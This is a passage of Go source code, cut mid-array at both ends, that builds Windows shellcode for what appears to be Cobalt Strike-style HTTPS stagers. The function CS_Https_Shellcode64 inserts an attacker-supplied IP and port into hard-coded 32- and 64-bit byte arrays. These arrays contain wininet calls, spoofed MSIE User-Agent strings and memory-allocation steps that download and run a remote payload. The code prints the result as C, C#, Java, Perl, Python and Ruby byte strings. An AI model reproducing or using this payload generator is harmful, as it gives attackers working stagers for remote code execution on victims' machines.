0x67, 0x72, 0x82, 0xfa, 0x7f, 0xaf, 0xd0, 0xdf, 0xf9, 0xab, 0xc3, 0x21, 0x6f, 0x9e, 0xa6, 0x8e, 0x0b, 0x3b, 0x71, 0xd9, 0xf2, 0x2f, 0xb7, 0x14, 0x60, 0x55, 0x03, 0xa0, 0x14, 0xba, 0x9f, 0x4f, 0xe0, 0x76, 0x7a, 0x0c, 0xd2, 0xd3, 0x02, 0x02, 0xce, 0xaf, 0x29, 0x8e, 0x4e, 0xb3, 0x4a, 0x65, 0xf0, 0x76, 0x66, 0xa8, 0x1a, 0xf9, 0x53, 0xe4, 0x02, 0x42, 0xb6, 0x9c, 0xaa, 0x79, 0xa9, 0x43, 0xb0, 0x9b, 0x87, 0xad, 0xd9, 0xc8, 0x80, 0xf1, 0x80, 0xd3, 0xca, 0xfb, 0x58, 0x13, 0xca, 0xc7, 0xd7, 0xb2, 0x05, 0x0e, 0xc8, 0x4b, 0x11, 0xd0, 0xdd, 0x61, 0x3a, 0xcf, 0x0c, 0x87, 0x6d, 0xe2, 0xae, 0x25, 0x84, 0x9c, 0x0e, 0x3f, 0x7e, 0x43, 0x41, 0xb7, 0x38, 0xd7, 0x17, 0x75, 0x1d, 0x02, 0x09, 0xb1, 0xf2, 0x5e, 0xdc, 0x25, 0x3c, 0x83, 0xaf, 0x75, 0x2b, 0x79, 0x1c, 0xf3, 0xd3, 0xeb, 0xcb, 0x72, 0x07, 0x78, 0x2b, 0x93, 0x27, 0x8b, 0x42, 0xdd, 0x99, 0xd8, 0x78, 0x55, 0x44, 0xc5, 0xe5, 0x39, 0x02, 0x6f, 0x57, 0x9e, 0x27, 0x1a, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Python = Python + fmt.Sprintf("0x%02x,", v)
	}
	Ruby := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x74, 0x49, 0x5a, 0x45, 0x00, 0x00, 0x84, 0x32, 0xda, 0x26, 0xb9, 0x5b, 0xd9, 0x27, 0x2d, 0xb6, 0xab, 0x8f, 0x1d, 0x61, 0x21, 0x67, 0x60, 0x87, 0x14, 0x7a, 0x59, 0xd1, 0x81, 0x68, 0xc6, 0x21, 0xa5, 0x92, 0x20, 0x9f, 0x00, 0xf4, 0xcf, 0x33, 0x6f, 0x98, 0xba, 0x24, 0xca, 0xcb, 0xd1, 0xe8, 0x0f, 0x40, 0x4d, 0x77, 0x36, 0xef, 0xc8, 0x7a, 0x23, 0xbf, 0x7b, 0xb2, 0xd0, 0x10, 0xbe, 0x45, 0x88, 0xe8, 0xe7, 0x38, 0xb7, 0xf5, 0xb1, 0x2a, 0xed, 0x69, 0x95, 0x69, 0x08, 0xd8, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x58, 0x42, 0x4c, 0x57, 0x50, 0x37, 0x3b, 0x20, 0x5a, 0x75, 0x6e, 0x65, 0x57, 0x50, 0x37, 0x29, 0x0d, 0x0a, 0x00, 0x96, 0xa3, 0xf6, 0xf7, 0x35, 0xf3, 0x1d, 0x7f, 0xe6, 0xad, 0x9e, 0xa6, 0xf6, 0xb3, 0x6f, 0x93, 0xa9, 0x8b, 0xb8, 0xca, 0x1c, 0x31, 0x8e, 0xb9, 0x16, 0xde, 0xa8, 0x5b, 0x42, 0x53, 0x92, 0xe1, 0xf7, 0x15, 0x81, 0x32, 0x19, 0x69, 0x2e, 0x43, 0x94, 0xd4, 0xcf, 0xb8, 0x50, 0x9b, 0x52, 0x8c, 0xcd, 0x82, 0x08, 0x7a, 0x62, 0x22, 0xc8, 0x16, 0xba, 0x2e, 0x97, 0x4a, 0xb2, 0x1e, 0xbe, 0x15, 0xac, 0x43, 0x15, 0x03, 0x07, 0x25, 0x4a, 0xdf, 0x4e, 0x1c, 0xe5, 0x98, 0x37, 0xe6, 0xf6, 0x1b, 0x27, 0x6d, 0xf4, 0x99, 0x9e, 0x65, 0x60, 0x7b, 0x08, 0x2a, 0x63, 0x25, 0xbe, 0x9c, 0x1a, 0xcd, 0xbe, 0xd2, 0xe5, 0x6d, 0x9a, 0xc5, 0xd5, 0xb4, 0x62, 0xa0, 0x39, 0x5f, 0xf4, 0x3d, 0x61, 0xf0, 0xa8, 0xc3, 0x44, 0x4b, 0x02, 0xda, 0xf5, 0xd6, 0xa9, 0xd4, 0x44, 0x1c, 0xe2, 0x3d, 0x37, 0x27, 0xf0, 0xb5, 0x01, 0xfc, 0xbb, 0xb1, 0x07, 0x6f, 0x69, 0x03, 0x09, 0xc1, 0x6e, 0x8e, 0xef, 0x5c, 0x29, 0xb2, 0xce, 0xd0, 0x7e, 0x68, 0x6a, 0xf9, 0x45, 0x47, 0x5c, 0x6e, 0x8d, 0x81, 0x44, 0xbf, 0x5c, 0x6e, 0xf4, 0x5b, 0x31, 0x70, 0x9f, 0x27, 0xbe, 0x7d, 0x1e, 0x01, 0x75, 0xc3, 0xd8, 0xd6, 0x27, 0x2f, 0xd5, 0xa9, 0xab, 0xf6, 0x12, 0x32, 0xa3, 0x7b, 0xdb, 0x15, 0xc6, 0x3e, 0xc8, 0x6d, 0xf4, 0xb8, 0x66, 0x51, 0x57, 0x98, 0x1c, 0xb9, 0xe0, 0x21, 0xf6, 0x98, 0xd4, 0xcb, 0x36, 0x26, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Ruby = Ruby + fmt.Sprintf("0x%02x,", v)
	}
	return CS_Shellcode{
		C,
		Cs,
		Java,
		Perl,
		Python,
		Ruby,
	}
}

func CS_Https_Shellcode64(ip string, port string) CS_Shellcode {
	port_int, _ := strconv.Atoi(port)
	port_byte := Port_byte_rec_IntToBytes(port_int)
	ip_byte := []byte(ip)
	fmt.Printf("%#v\n\n\n\n", ip_byte)
	head := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8}
	C := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x45, 0x58, 0x49, 0x77, 0x00, 0x27, 0x01, 0xda, 0x04, 0x2b, 0x13, 0x2c, 0x3e, 0xcc, 0xe2, 0x3e, 0x9c, 0x18, 0xcf, 0xac, 0xc4, 0x98, 0x0a, 0x43, 0xd6, 0x59, 0x3e, 0xd3, 0xce, 0xfa, 0x6d, 0x7e, 0x9d, 0x40, 0x90, 0xdc, 0x6e, 0xc6, 0xf3, 0x07, 0xd3, 0xf2, 0xe2, 0x08, 0x29, 0x18, 0xce, 0xec, 0x6a, 0x4e, 0x53, 0xc3, 0x51, 0x87, 0xd7, 0x5c, 0x0c, 0xc8, 0x4d, 0x2b, 0x6e, 0xfa, 0x40, 0x6b, 0x35, 0xa4, 0xe8, 0x01, 0x1d, 0x7d, 0x83, 0xa8, 0x86, 0xe6, 0xc4, 0xda, 0x53, 0x31, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x41, 0x76, 0x61, 0x6e, 0x74, 0x20, 0x42, 0x72, 0x6f, 0x77, 0x73, 0x65, 0x72, 0x29, 0x0d, 0x0a, 0x00, 0x66, 0xf2, 0xf6, 0x83, 0xce, 0x95, 0x89, 0xdb, 0x22, 0x9d, 0xf7, 0x3a, 0x50, 0xc1, 0xe3, 0x28, 0xdd, 0xbe, 0xe6, 0x52, 0x3c, 0x0d, 0x93, 0x4c, 0xc9, 0x7d, 0xaa, 0x8d, 0x5d, 0x66, 0xa3, 0x7d, 0x21, 0x5d, 0xc8, 0xc3, 0xc0, 0x94, 0x1e, 0x9b, 0x2b, 0xcc, 0x37, 0xe3, 0x29, 0xe7, 0xea, 0xfb, 0x0d, 0xce, 0xf4, 0x5e, 0xf7, 0x01, 0x2c, 0x91, 0xaa, 0x2d, 0x3f, 0xd9, 0x43, 0xcc, 0x21, 0x9c, 0x9b, 0xaf, 0x42, 0x08, 0xaf, 0x41, 0x45, 0xc4, 0xc5, 0x93, 0xa0, 0x75, 0x3b, 0x9e, 0xa0, 0xc2, 0xc0, 0x76, 0x4f, 0x38, 0x98, 0xaa, 0x21, 0xea, 0x85, 0xde, 0xd9, 0x4c, 0x25, 0xd4, 0x29, 0x92, 0xa1, 0x46, 0x97, 0xa7, 0xd2, 0xca, 0x8c, 0x24, 0x37, 0xd3, 0x7f, 0x6f, 0x41, 0x1f, 0x49, 0x64, 0xb7, 0xf9, 0x57, 0xe3, 0x77, 0x93, 0x5f, 0xad, 0xe3, 0xa3, 0x5c, 0x2c, 0x7e, 0x90, 0x6d, 0x44, 0x0a, 0x95, 0x43, 0xcb, 0x9d, 0xe0, 0x14, 0x95, 0x77, 0xbc, 0xd3, 0x95, 0x5c, 0xab, 0x60, 0x23, 0xf9, 0x74, 0xf4, 0xad, 0x32, 0xf2, 0x19, 0x1c, 0xcf, 0xcc, 0x65, 0x3d, 0xab, 0x79, 0xbc, 0xfe, 0xe3, 0xa5, 0x37, 0x3c, 0xee, 0x1e, 0x21, 0x94, 0xef, 0x85, 0x27, 0xc6, 0x5b, 0x88, 0x5a, 0x52, 0x5a, 0x8b, 0x5a, 0x4c, 0x78, 0x8a, 0xd6, 0x2f, 0x44, 0x24, 0xd5, 0x6f, 0xb2, 0xa6, 0xe9, 0xe1, 0x92, 0xf9, 0x02, 0xe3, 0xc4, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		C = C + fmt.Sprintf("0x%02x,", v)
	}
	Cs := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x5a, 0x46, 0x7a, 0x43, 0x00, 0xca, 0xb2, 0x9f, 0x72, 0x7c, 0xc8, 0x27, 0x97, 0x68, 0x0a, 0xd8, 0x49, 0x67, 0xf4, 0xcf, 0x9d, 0xed, 0xb4, 0xd9, 0xb5, 0x59, 0xd0, 0xed, 0x6a, 0xd5, 0x32, 0x38, 0xe8, 0x51, 0xa1, 0x12, 0x9c, 0xcf, 0xa3, 0xe3, 0x9f, 0xb1, 0xfb, 0x61, 0xc0, 0x53, 0x07, 0xbc, 0xa3, 0x3d, 0xe1, 0xfe, 0x9f, 0x1d, 0xe9, 0x03, 0x4c, 0x81, 0x94, 0xd9, 0x88, 0x69, 0x26, 0x6c, 0x80, 0xd8, 0x5b, 0xa0, 0xe9, 0x30, 0x56, 0x80, 0xaa, 0x3b, 0x9d, 0x0e, 0xfe, 0xa0, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x34, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0xae, 0x75, 0xcf, 0x1c, 0x90, 0x4e, 0x0a, 0xe2, 0xee, 0xa0, 0x14, 0x40, 0x32, 0xc3, 0x48, 0xa0, 0x71, 0xc2, 0x9d, 0x6c, 0x80, 0x2d, 0xfc, 0x15, 0x27, 0xad, 0x7c, 0x5e, 0x31, 0xf7, 0x39, 0xed, 0x08, 0x02, 0x14, 0x8a, 0x26, 0x3b, 0x93, 0x4f, 0x92, 0xe1, 0x01, 0xca, 0x59, 0x0a, 0x18, 0x9b, 0xcc, 0x7d, 0x77, 0xad, 0xf2, 0x22, 0xbd, 0xae, 0xa5, 0x91, 0x7e, 0xf6, 0xb6, 0xb6, 0xa7, 0xf9, 0x42, 0x1a, 0x51, 0xb4, 0x63, 0x73, 0xc8, 0xae, 0xaf, 0xef, 0xfd, 0xc2, 0xab, 0xf9, 0x64, 0x2f, 0xbb, 0x35, 0x3e, 0x35, 0x29, 0x79, 0xac, 0x18, 0xdf, 0x04, 0xeb, 0xc8, 0xd0, 0x33, 0x11, 0xd6, 0x99, 0x60, 0x9b, 0xf6, 0xbe, 0x9d, 0x6c, 0x4e, 0x55, 0x15, 0x00, 0xac, 0xa5, 0x15, 0x10, 0x6f, 0x96, 0xdd, 0xc6, 0x74, 0x05, 0x04, 0xa2, 0xda, 0x2c, 0xb4, 0x4e, 0x7e, 0x73, 0x87, 0xf8, 0x0a, 0x39, 0x80, 0xcd, 0x9a, 0xbb, 0x3b, 0x08, 0x40, 0xc7, 0x52, 0xc2, 0x0f, 0x04, 0x78, 0x06, 0x4b, 0x2a, 0x5e, 0x22, 0xad, 0x9c, 0xe6, 0x53, 0x36, 0x08, 0x3a, 0xc8, 0xa0, 0x52, 0x8a, 0x8a, 0xf4, 0xc3, 0x75, 0xd8, 0xc0, 0xb6, 0xf9, 0x04, 0x1c, 0xf8, 0xb2, 0x10, 0xf6, 0x12, 0xc7, 0xd7, 0x51, 0xe3, 0x3f, 0x36, 0xf2, 0x20, 0xb2, 0xb2, 0x76, 0x5b, 0xd6, 0x04, 0x7c, 0xf7, 0x97, 0xf1, 0xed, 0x7f, 0x31, 0x76, 0x8d, 0x3a, 0xa6, 0x36, 0x8a, 0xe8, 0x1b, 0x99, 0xc9, 0x5b, 0xdd, 0x33, 0x3f, 0xd0, 0xde, 0x40, 0x88, 0xf8, 0xcc, 0xfa, 0xb9, 0x55, 0x61, 0xcc, 0xee, 0xdc, 0xb5, 0xa6, 0xda, 0x67, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Cs = Cs + fmt.Sprintf("0x%02x,", v)
	}
	Java := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x43, 0x70, 0x48, 0x62, 0x00, 0x71, 0x1e, 0xad, 0xca, 0x78, 0x62, 0xe0, 0xad, 0x98, 0x07, 0x8d, 0x6a, 0xca, 0xd2, 0x8a, 0xe5, 0x57, 0x0a, 0xe3, 0x16, 0x44, 0xa9, 0xde, 0x53, 0x30, 0x7a, 0xe8, 0xc6, 0x99, 0x3c, 0x43, 0xe3, 0xb3, 0x5e, 0x9e, 0x6a, 0x01, 0x70, 0x2f, 0x19, 0x90, 0x17, 0x22, 0x21, 0xe0, 0xea, 0x1f, 0x5a, 0x0c, 0x25, 0x08, 0xfa, 0xf1, 0x0d, 0x2c, 0xb7, 0x40, 0xe5, 0xc4, 0x38, 0xed, 0x24, 0x50, 0xdf, 0xa6, 0x47, 0xaf, 0x2e, 0x5b, 0x8e, 0x66, 0xb7, 0x77, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 